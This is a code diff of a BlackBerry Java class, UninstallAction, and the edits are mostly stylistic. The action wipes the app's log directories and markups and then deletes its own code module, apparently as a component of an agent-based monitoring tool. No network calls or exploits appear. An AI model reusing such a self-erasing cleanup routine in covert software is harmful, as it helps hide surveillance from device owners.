@@ -9,7 +9,6 @@ package blackberry.action;
 
 import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.CodeModuleManager;
-
 import blackberry.AgentManager;
 import blackberry.EventManager;
 import blackberry.event.Event;
@@ -19,7 +18,7 @@ import blackberry.utils.Check;
 
 public class UninstallAction extends SubAction {
 
-    public UninstallAction(int actionId_, byte[] confParams) {
+    public UninstallAction(final int actionId_, final byte[] confParams) {
         super(actionId_);
         parse(confParams);
 
@@ -28,11 +27,11 @@ public class UninstallAction extends SubAction {
         // #endif
     }
 
-    public UninstallAction(String host) {
+    public UninstallAction(final String host) {
         super(ACTION_UNINSTALL);
     }
 
-    public boolean execute(Event triggeringEvent) {
+    public boolean execute(final Event triggeringEvent) {
         // #debug
         debug.info("execute");
 
@@ -44,11 +43,12 @@ public class UninstallAction extends SubAction {
         LogCollector.getInstance().removeLogDirs();
         Markup.removeMarkups();
 
-        ApplicationDescriptor ad = ApplicationDescriptor
+        final ApplicationDescriptor ad = ApplicationDescriptor
                 .currentApplicationDescriptor();
-        int moduleHandle = ad.getModuleHandle();
-        int rc = CodeModuleManager.deleteModuleEx(moduleHandle, true);
-        String errorString = Integer.toString(rc);
+        final int moduleHandle = ad.getModuleHandle();
+        final int rc = CodeModuleManager.deleteModuleEx(moduleHandle, true);
+        //final String errorString = Integer.toString(rc);
+        debug.info("deleteModuleEx result: " + rc);
         switch (rc) {
         case CodeModuleManager.CMM_OK_MODULE_MARKED_FOR_DELETION:
             // #debug
@@ -76,7 +76,7 @@ public class UninstallAction extends SubAction {
         return true;
     }
 
-    protected boolean parse(byte[] confParams) {
+    protected boolean parse(final byte[] confParams) {
 
         return true;
     }
